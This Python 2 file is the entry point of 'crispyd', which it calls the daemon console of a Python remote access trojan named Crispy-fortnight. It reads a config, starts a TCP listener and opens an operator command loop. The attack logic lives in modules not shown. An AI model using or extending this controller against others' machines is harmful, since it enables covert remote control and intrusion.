import argparse
import logging
import ConfigParser

from crispy.network.server_handler import CrispyTCPServerHandler
from crispy.lib.server import CrispyTCPServer
from crispy.lib.cli import CrispyCLI
    
__version__ = 'v1.0.0'

def main():
    argp = argparse.ArgumentParser(description="Crispy-fortnight (Python RAT) daemon console.",
                                   epilog="Do NOT use this for nefarious purposes!", 
                                   prog="crispyd")
    argp.add_argument("--config",
                        dest="config_file",
                        help="Path to crispy config file",
                        metavar="<config_file>",
                        required=True,
                        type=str)
    argp.add_argument("--loglvl",
			choices=["DEBUG", "ERROR", "INFO", "WARNING"],
			default="WARNING",
			dest="loglevel",
			help="Change log verbosity",
			type=str)
    argp.add_argument("--version", 
                        action="store_true", 
                        help="Print version and exit")
    args = argp.parse_args()

    if args.version: 
	print "{}".format(__version__)

    if args.loglevel == "DEBUG":
	loglevel = logging.DEBUG
    elif args.loglevel == "ERROR":
	loglevel = logging.ERROR
    elif args.loglevel == "INFO":
	loglevel = logging.INFO
    else:
	loglevel = logging.WARNING
    
    logging.basicConfig(datefmt='%m/%d/%Y %I:%M:%S %p',
			filename='crispy.log',
			format='%(asctime)-15s - %(levelname)-5s - %(module)-3s - %(message)s',
			level=loglevel)

    config = ConfigParser.ConfigParser()
    config.read(args.config_file)
    
    host = config.get('DAEMON', 'host')
    port = config.getint('DAEMON', 'port')

    srv = CrispyTCPServer((host, port), CrispyTCPServerHandler)
    logging.info("Started server on {0}:{1}".format(srv.server_address[0], srv.server_address[1]))

    cli = CrispyCLI(srv)

    while True:
	try:
	    cli.cmdloop()
	except Exception as e:
	    logging.info("Server shutting down")
	    logging.shutdown()
	    srv.shutdown()
	    srv.socket.close()
	    exit()

if __name__ == "__main__":
    main()
